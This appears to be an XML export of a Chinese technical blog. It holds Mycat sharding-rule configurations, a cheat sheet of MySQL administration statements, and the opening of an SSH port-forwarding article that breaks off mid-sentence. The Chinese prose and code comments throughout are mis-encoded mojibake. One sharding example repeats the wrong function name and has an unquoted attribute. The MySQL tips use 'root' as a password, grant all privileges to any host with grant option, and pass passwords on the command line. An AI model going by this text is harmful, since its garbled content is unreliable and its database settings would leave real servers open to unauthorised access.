class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"sharding-by-substring"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--åˆ†ç‰‡å‡½æ•°--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>sharding-by-substring<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line">   <span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"sharding-by-substring"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionDirectBySubString"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"startIndex"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span> <span class="comment">&lt;!-- zero-based --&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"size"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"partitionCount"</span>&gt;</span>8<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"defaultPartition"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>æ­¤æ–¹æ³•ä¸ºç›´æ¥æ ¹æ®å­—ç¬¦å­ä¸²ï¼ˆå¿…é¡»æ˜¯æ•°å­—ï¼‰è®¡ç®—åˆ†åŒºå·ï¼ˆç”±åº”ç”¨ä¼ é€’å‚æ•°ï¼Œæ˜¾å¼æŒ‡å®šåˆ†åŒºå·ï¼‰ã€‚<br>ä¾‹å¦‚id=05-100000002<br>åœ¨æ­¤é…ç½®ä¸­ä»£è¡¨æ ¹æ®idä¸­ä»startIndex=0ï¼Œå¼€å§‹ï¼Œæˆªå–siz=2ä½æ•°å­—å³05ï¼Œ05å°±æ˜¯è·å–çš„åˆ†åŒºï¼Œå¦‚æœæ²¡ä¼ é»˜è®¤åˆ†é…åˆ°defaultPartition</p><h2 id="9-å­—ç¬¦ä¸²æ‹†åˆ†hashè§£æ"><a href="#9-å­—ç¬¦ä¸²æ‹†åˆ†hashè§£æ" class="headerlink" title="9.å­—ç¬¦ä¸²æ‹†åˆ†hashè§£æ"></a>9.å­—ç¬¦ä¸²æ‹†åˆ†hashè§£æ</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"sharding-by-stringhash"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--åˆ†ç‰‡å‡½æ•°--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>sharding-by-stringhash<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"sharding-by-substring"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionDirectBySubString"</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--å­—ç¬¦ä¸²hashæ±‚æ¨¡åŸºæ•°--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">length</span>&gt;</span>512<span class="tag">&lt;/<span class="name">property</span>&gt;</span> <span class="comment">&lt;!-- zero-based --&gt;</span></div><div class="line">    <span class="comment">&lt;!--åˆ†åŒºæ•°--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"count"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--é¢„ç®—ä½--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"hashSlice"</span>&gt;</span>0:2<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>hashSlice ï¼š 0 means str.length(), -1 means str.length()-1</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></div><div class="code"><pre><div class="line">&gt; &quot;2&quot; -&amp;gt; (0,2)&lt;br/&gt;</div><div class="line">&gt; &quot;1:2&quot; -&amp;gt; (1,2)&lt;br/&gt;</div><div class="line">&gt; &quot;1:&quot; -&amp;gt; (1,0)&lt;br/&gt;</div><div class="line">&gt; &quot;-1:&quot; -&amp;gt; (-1,0)&lt;br/&gt;</div><div class="line">&gt; &quot;:-1&quot; -&amp;gt; (0,-1)&lt;br/&gt;</div><div class="line">&gt; &quot;:&quot; -&amp;gt; (0,0)&lt;br/&gt;</div></pre></div></div></figure><p>ä¾‹å­ï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></div><div class="code"><pre><div class="line">String idVal=null;</div><div class="line"> rule.setPartitionLength(&quot;512&quot;);</div><div class="line"> rule.setPartitionCount(&quot;2&quot;);</div><div class="line"> rule.init();</div><div class="line"> rule.setHashSlice(&quot;0:2&quot;);</div><div class="line">//idVal = &quot;0&quot;;</div><div class="line">//Assert.assertEquals(true, 0 == rule.calculate(idVal));</div><div class="line">//idVal = &quot;45a&quot;;</div><div class="line">//Assert.assertEquals(true, 1 == rule.calculate(idVal));</div><div class="line"></div><div class="line"> </div><div class="line"> </div><div class="line">//last 4</div><div class="line">rule = new PartitionByString();</div><div class="line">rule.setPartitionLength(&quot;512&quot;);</div><div class="line">rule.setPartitionCount(&quot;2&quot;);</div><div class="line">rule.init();</div><div class="line">//last 4 characters</div><div class="line">rule.setHashSlice(&quot;-4:0&quot;);</div><div class="line">idVal = &quot;aaaabbb0000&quot;;</div><div class="line">Assert.assertEquals(true, 0 == rule.calculate(idVal));</div><div class="line">idVal = &quot;aaaabbb2359&quot;;</div><div class="line">Assert.assertEquals(true, 0 == rule.calculate(idVal));</div></pre></div></div></figure><h2 id="10-ä¸€è‡´æ€§hash"><a href="#10-ä¸€è‡´æ€§hash" class="headerlink" title="10. ä¸€è‡´æ€§hash"></a>10. ä¸€è‡´æ€§hash</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"sharding-by-murmur"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>murmur<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"murmur"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByMurmurHash"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"seed"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span><span class="comment">&lt;!-- é»˜è®¤æ˜¯0--&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"count"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">property</span>&gt;</span><span class="comment">&lt;!-- è¦åˆ†ç‰‡çš„æ•°æ®åº“èŠ‚ç‚¹æ•°é‡ï¼Œå¿…é¡»æŒ‡å®šï¼Œå¦åˆ™æ²¡æ³•åˆ†ç‰‡--&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"virtualBucketTimes"</span>&gt;</span>160<span class="tag">&lt;/<span class="name">property</span>&gt;</span><span class="comment">&lt;!-- ä¸€ä¸ªå®é™…çš„æ•°æ®åº“èŠ‚ç‚¹è¢«æ˜ å°„ä¸ºè¿™ä¹ˆå¤šè™šæ‹ŸèŠ‚ç‚¹ï¼Œé»˜è®¤æ˜¯160å€ï¼Œä¹Ÿå°±æ˜¯è™šæ‹ŸèŠ‚ç‚¹æ•°æ˜¯ç‰©ç†èŠ‚ç‚¹æ•°çš„160å€--&gt;</span></div><div class="line">      <span class="comment">&lt;!--</span></div><div class="line"><span class="comment">      &lt;property name="weightMapFile"&gt;weightMapFile&lt;/property&gt;</span></div><div class="line"><span class="comment">                     èŠ‚ç‚¹çš„æƒé‡ï¼Œæ²¡æœ‰æŒ‡å®šæƒé‡çš„èŠ‚ç‚¹é»˜è®¤æ˜¯1ã€‚ä»¥propertiesæ–‡ä»¶çš„æ ¼å¼å¡«å†™ï¼Œä»¥ä»0å¼€å§‹åˆ°count-1çš„æ•´æ•°å€¼ä¹Ÿå°±æ˜¯èŠ‚ç‚¹ç´¢å¼•ä¸ºkeyï¼Œä»¥èŠ‚ç‚¹æƒé‡å€¼ä¸ºå€¼ã€‚æ‰€æœ‰æƒé‡å€¼å¿…é¡»æ˜¯æ­£æ•´æ•°ï¼Œå¦åˆ™ä»¥1ä»£æ›¿ --&gt;</span></div><div class="line">      <span class="comment">&lt;!--</span></div><div class="line"><span class="comment">      &lt;property name="bucketMapPath"&gt;/etc/mycat/bucketMapPath&lt;/property&gt;</span></div><div class="line"><span class="comment">                      ç”¨äºæµ‹è¯•æ—¶è§‚å¯Ÿå„ç‰©ç†èŠ‚ç‚¹ä¸è™šæ‹ŸèŠ‚ç‚¹çš„åˆ†å¸ƒæƒ…å†µï¼Œå¦‚æœæŒ‡å®šäº†è¿™ä¸ªå±æ€§ï¼Œä¼šæŠŠè™šæ‹ŸèŠ‚ç‚¹çš„murmur hashå€¼ä¸ç‰©ç†èŠ‚ç‚¹çš„æ˜ å°„æŒ‰è¡Œè¾“å‡ºåˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œæ²¡æœ‰é»˜è®¤å€¼ï¼Œå¦‚æœä¸æŒ‡å®šï¼Œå°±ä¸ä¼šè¾“å‡ºä»»ä½•ä¸œè¥¿ --&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>ä¸€è‡´æ€§hashé¢„ç®—æœ‰æ•ˆè§£å†³äº†åˆ†å¸ƒå¼æ•°æ®çš„æ‰©å®¹é—®é¢˜ï¼Œå‰1-9ä¸­idè§„åˆ™éƒ½å¤šå°‘å­˜åœ¨æ•°æ®æ‰©å®¹éš¾é¢˜ï¼Œè€Œ10è§„åˆ™è§£å†³äº†æ•°æ®æ‰©å®¹éš¾ç‚¹</p>]]></content>
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
          <category> Mycat </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mycat </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å¸¸ç”¨Mysqlè¯­å¥</title>
      <link href="/2017/03/14/mysql-sql/"/>
      <url>/2017/03/14/mysql-sql/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>çºªå½•è¿ç»´è¿‡ç¨‹å¸¸ç”¨çš„sqlèªå¥ï¼Œå¤‡å¿˜ åˆ›å»ºæ•°æ®åº“ CREATE DATABASE test CHARACTER SET UTF8; å­—ç¬¦é›†ä¸ºUTF8</p></blockquote><a id="more"></a><h2 id="0x01-ç”¨æˆ¶å¯†ç åŠç™»é™†ç›¸å…³"><a href="#0x01-ç”¨æˆ¶å¯†ç åŠç™»é™†ç›¸å…³" class="headerlink" title="0x01 ç”¨æˆ¶å¯†ç åŠç™»é™†ç›¸å…³"></a>0x01 ç”¨æˆ¶å¯†ç åŠç™»é™†ç›¸å…³</h2><h3 id="1-æ›´æ”¹å¯†ç "><a href="#1-æ›´æ”¹å¯†ç " class="headerlink" title="1. æ›´æ”¹å¯†ç "></a>1. æ›´æ”¹å¯†ç </h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> <span class="keyword">password</span>=<span class="keyword">password</span>(<span class="string">'root'</span>) <span class="keyword">where</span> <span class="keyword">user</span>=<span class="string">'root'</span>;</div><div class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</div></pre></div></div></figure><h3 id="2-å…è®¸è¿œç¨‹ç™»å½•"><a href="#2-å…è®¸è¿œç¨‹ç™»å½•" class="headerlink" title="2. å…è®¸è¿œç¨‹ç™»å½•"></a>2. å…è®¸è¿œç¨‹ç™»å½•</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="string">'username'</span>@<span class="string">'%'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'password'</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</div><div class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</div></pre></div></div></figure><h3 id="3-æ›´æ”¹Mysqlç›‘å¬åœ°å€"><a href="#3-æ›´æ”¹Mysqlç›‘å¬åœ°å€" class="headerlink" title="3. æ›´æ”¹Mysqlç›‘å¬åœ°å€"></a>3. æ›´æ”¹Mysqlç›‘å¬åœ°å€</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">vim /etc/my.cnf</div><div class="line">#åœ¨[mysqld]ä¸­æ·»åŠ </div><div class="line">bind-address=127.0.0.1</div></pre></div></div></figure><h3 id="4-åˆ›å»ºç”¨æˆ·"><a href="#4-åˆ›å»ºç”¨æˆ·" class="headerlink" title="4. åˆ›å»ºç”¨æˆ·"></a>4. åˆ›å»ºç”¨æˆ·</h3><figure class="highlight"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">grant</span> all <span class="keyword">privileges</span> <span class="keyword">on</span> database.tables <span class="keyword">to</span> <span class="string">'username'</span>@<span class="string">'127.0.0.1'</span> <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'password'</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</div><div class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</div><div class="line"># all privileges ---- æ‰€æœ‰æƒé™(å¯æŒ‡å®šSELECT,DROP,UPDATE,INSTER....)</div></pre></div></div></figure><h3 id="5-æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ¶åŸºæœ¬ä¿¡æ¯"><a href="#5-æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ¶åŸºæœ¬ä¿¡æ¯" class="headerlink" title="5. æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ¶åŸºæœ¬ä¿¡æ¯"></a>5. æŸ¥è¯¢æ‰€æœ‰ç”¨æˆ¶åŸºæœ¬ä¿¡æ¯</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span>,host,<span class="keyword">password</span> <span class="keyword">FROM</span> mysql.user;??</div></pre></div></div></figure><div class="note warning"><p>åˆå§‹å®‰è£æ•°æ®åº“ä½¿ç”¨mysqladminè®¾ç½®å¯†ç åï¼Œç›´æ¥ä½¿ç”¨mysql -uroot -ppasswd ç™»é™†æ­£å¸¸ï¼Œ<br>ä½¿ç”¨mysql -uroot -ppasswd -h127.0.0.1<br>æŠ¥é”™:<br>Access denied for user â€˜rootâ€˜@â€™hostnameâ€™<br>è®¾ç½®å…è®¸è¿œç¨‹ç™»é™†,ä»ç„¶æŠ¥é”™<br>è¿™æ—¶ä½¿ç”¨SELECT user,host,password FROM mysql.user;è¯­å¥è¿›è¡ŒæŸ¥è¯¢<br>+â€”â€”â€“+â€”â€”â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-+<br>| root   | localhost      | <em>3E8000C2FA234A170531B9063518B3B479E7C47B |<br>| root   | 127.0.0.1      | </em>2E9879C2FA764A1705567896B518B3B47324EA23 |<br>+â€”â€”â€“+â€”â€”â€”â€”â€”-+â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”-+<br>æ›´æ”¹ç‚ºç›¸åŒå³å¯</p></div><h2 id="0x02-æ•°æ®å¢åˆªæ”¹æŸ¥"><a href="#0x02-æ•°æ®å¢åˆªæ”¹æŸ¥" class="headerlink" title="0x02 æ•°æ®å¢åˆªæ”¹æŸ¥"></a>0x02 æ•°æ®å¢åˆªæ”¹æŸ¥</h2><h3 id="1-æ‰¹é‡åˆªé™¤åŒ¹é…çš„è¡¨"><a href="#1-æ‰¹é‡åˆªé™¤åŒ¹é…çš„è¡¨" class="headerlink" title="1. æ‰¹é‡åˆªé™¤åŒ¹é…çš„è¡¨"></a>1. æ‰¹é‡åˆªé™¤åŒ¹é…çš„è¡¨</h3><figure class="highlight"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></div><div class="code"><pre><div class="line">ä¾‹ï¼š</div><div class="line">+<span class="comment">-----------------------------+</span></div><div class="line">| userregin2017_03_01         |</div><div class="line">| userregin2017_03_02         |</div><div class="line">| userregin2017_03_03         |</div><div class="line">| userregin2017_03_04         |</div><div class="line">| userregin2017_03_05         |</div><div class="line">| userregin2017_03_06         |</div><div class="line">| userregin2017_03_07         |</div><div class="line">| userregin2017_03_08         |</div><div class="line">| userregin2017_03_09         |</div><div class="line">| userregin2017_03_10         |</div><div class="line">| userregin2017_03_11         |</div><div class="line">| userregin2017_03_12         |</div><div class="line">| userregin2017_03_13         |</div><div class="line">+<span class="comment">-----------------------------+</span></div><div class="line"><span class="keyword">Select</span> <span class="keyword">CONCAT</span>( <span class="string">'drop table '</span>, table_name, <span class="string">';'</span> ) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">Where</span> table_name <span class="keyword">LIKE</span> <span class="string">'userregin%'</span>;</div><div class="line"># å¯¼å‡ºçš„æ•°æ®ä½¿ç”¨vimç¼–è¾‘Ctrl+v(é€‰å–) &gt;&gt; Shift+i &gt;&gt; ç¼–è¾‘ &gt;&gt; Esc &gt;&gt; æ–¹å‘é”®ä¸‹</div></pre></div></div></figure><h3 id="2-æŸ¥è¯¢æ•°æ®åº“å¤§å°"><a href="#2-æŸ¥è¯¢æ•°æ®åº“å¤§å°" class="headerlink" title="2. æŸ¥è¯¢æ•°æ®åº“å¤§å°"></a>2. æŸ¥è¯¢æ•°æ®åº“å¤§å°</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">concat</span>((<span class="keyword">SUM</span>(DATA_LENGTH)+<span class="keyword">SUM</span>(INDEX_LENGTH))/<span class="number">1024</span>/<span class="number">1024</span>,<span class="string">'MB'</span>) <span class="keyword">as</span> <span class="keyword">data</span> <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'your_database'</span>;</div></pre></div></div></figure><h3 id="3-æŸ¥è¯¢è¡¨å¤§å°"><a href="#3-æŸ¥è¯¢è¡¨å¤§å°" class="headerlink" title="3. æŸ¥è¯¢è¡¨å¤§å°"></a>3. æŸ¥è¯¢è¡¨å¤§å°</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">SELECT</span> <span class="keyword">concat</span>((<span class="keyword">SUM</span>(DATA_LENGTH)+<span class="keyword">SUM</span>(INDEX_LENGTH))/<span class="number">1024</span>/<span class="number">1024</span>,<span class="string">'MB'</span>) <span class="keyword">as</span> <span class="keyword">data</span> <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> TABLE_SCHEMA=<span class="string">'your_database'</span> <span class="keyword">and</span> TABLE_NAME=<span class="string">'your_table'</span>;</div></pre></div></div></figure><h3 id="4-æŸ¥è¯¢è¡¨ç»“æ„"><a href="#4-æŸ¥è¯¢è¡¨ç»“æ„" class="headerlink" title="4. æŸ¥è¯¢è¡¨ç»“æ„"></a>4. æŸ¥è¯¢è¡¨ç»“æ„</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">desc your_tableï¼›</div></pre></div></div></figure><h3 id="5-æŸ¥è¯¢å»ºè¡¨è¯­å¥"><a href="#5-æŸ¥è¯¢å»ºè¡¨è¯­å¥" class="headerlink" title="5. æŸ¥è¯¢å»ºè¡¨è¯­å¥"></a>5. æŸ¥è¯¢å»ºè¡¨è¯­å¥</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> table_name;</div></pre></div></div></figure><h3 id="6-åˆªé™¤"><a href="#6-åˆªé™¤" class="headerlink" title="6. åˆªé™¤"></a>6. åˆªé™¤</h3><p>æ¸…ç©ºè¡¨æ•°æ®ï¼š</p><figure class="highlight"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">table</span>ï¼›</div><div class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span>;</div><div class="line">#å¸¦è§„åˆ™æ¸…é™¤</div></pre></div></div></figure><h3 id="7-æŸ¥è¯¢è¡¨ä¸­NAMEå­—æ®µæœ‰å“ªäº›ç±»å‹"><a href="#7-æŸ¥è¯¢è¡¨ä¸­NAMEå­—æ®µæœ‰å“ªäº›ç±»å‹" class="headerlink" title="7. æŸ¥è¯¢è¡¨ä¸­NAMEå­—æ®µæœ‰å“ªäº›ç±»å‹"></a>7. æŸ¥è¯¢è¡¨ä¸­NAMEå­—æ®µæœ‰å“ªäº›ç±»å‹</h3><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">NAME</span> <span class="keyword">from</span> t_user <span class="keyword">group</span> <span class="keyword">by</span> <span class="keyword">NAME</span>;</div></pre></div></div></figure><h2 id="0x03-å¤‡ä»½è¿˜åŸ"><a href="#0x03-å¤‡ä»½è¿˜åŸ" class="headerlink" title="0x03 å¤‡ä»½è¿˜åŸ"></a>0x03 å¤‡ä»½è¿˜åŸ</h2><p>å‹ç¼©å¤‡ä»½ï¼š</p><figure class="highlight"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">mysqldump -B -uroot -proot Your_database| gzip &gt; Your_database.sql.gz</div></pre></div></div></figure><p>å‹ç¼©è¿˜åŸï¼š</p><figure class="highlight"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">gunzip &lt; Your_database.sql.gz | mysql -uroot -proot</div></pre></div></div></figure><p>sqlæ–‡ä»¶è¿˜åŸï¼š</p><figure class="highlight sql"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">mysql -uroot -proot</div><div class="line"><span class="keyword">use</span> Your_database;</div><div class="line">source /root/Your_database.sql;</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSHç«¯å£è½¬å‘</title>
      <link href="/2017/01/09/linux-ssh/"/>
      <url>/2017/01/09/linux-ssh/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>é€šè¿‡æœ¬æ–‡çš„ä»‹ç»ï¼Œè¯»è€…å¯ä»¥ä»ä¸­äº†è§£åˆ°å¦‚ä½•åº”ç”¨ SSH ç«¯å£è½¬å‘æœºåˆ¶æ¥è§£å†³æ—¥å¸¸å·¥ä½œ / ç”Ÿæ´»ä¸­çš„ä¸€äº›é—®é¢˜ã€‚å­¦ä¼šåœ¨éå®‰å…¨ç¯å¢ƒä¸‹ä½¿ç”¨ç«¯å£è½¬å‘æ¥åŠ å¯†ç½‘ç»œåº”ç”¨ï¼Œä¿æŠ¤ä¸ªäººéšç§ä»¥åŠé‡è¦å•†ä¸šä¿¡æ¯ã€‚åŒæ—¶ä¹Ÿèƒ½å¤Ÿç”¨æ­¤æŠ€æœ¯è§£å†³å·¥ä½œä¸­ä¸€äº›å¸¸è§é—®é¢˜ï¼Œä¾‹å¦‚è§£å†³é˜²ç«å¢™åŠç½‘ç»œåº”ç”¨æœ¬èº«å¸¦æ¥çš„ä¸€äº›é™åˆ¶ã€‚</p></blockquote><a id="more"></a><h2 id="0x01-ç«¯å£è½¬å‘æ¦‚è¿°"><a href="#0x01-ç«¯å£è½¬å‘æ¦‚è¿°" class="headerlink" title="0x01 ç«¯å£è½¬å‘æ¦‚è¿°"></a>0x01 ç«¯å£è½¬å‘æ¦‚è¿°</h2><p>SSH ä¼šè‡ªåŠ¨åŠ å¯†å’Œè§£å¯†æ‰€æœ‰ SSH å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯ä¹‹é—´çš„ç½‘ç»œæ•°æ®ã€‚ä½†æ˜¯ï¼ŒSSH è¿˜åŒæ—¶æä¾›äº†ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„åŠŸèƒ½ï¼Œè¿™å°±æ˜¯ç«¯å£è½¬å‘ã€‚å®ƒèƒ½å¤Ÿå°†å…¶ä»– TCP ç«¯å£çš„ç½‘ç»œæ•°æ®é€šè¿‡ SSH é“¾æ¥æ¥è½¬å‘ï¼Œå¹¶ä¸”è‡ªåŠ¨æä¾›äº†ç›¸åº”çš„åŠ å¯†åŠè§£å¯†æœåŠ¡ã€‚è¿™ä¸€è¿‡ç¨‹æœ‰æ—¶ä¹Ÿè¢«å«åšéš§é“ï¼ˆtunnelingï¼‰ï¼Œè¿™æ˜¯å› ä¸º SSH ä¸ºå…¶ä»– TCP é“¾æ¥æä¾›äº†ä¸€ä¸ªå®‰å…¨çš„é€šé“æ¥è¿›è¡Œä¼ è¾“è€Œå¾—åã€‚</p><p>ä¾‹å¦‚ï¼ŒTelnetï¼ŒSMTPï¼ŒLDAP 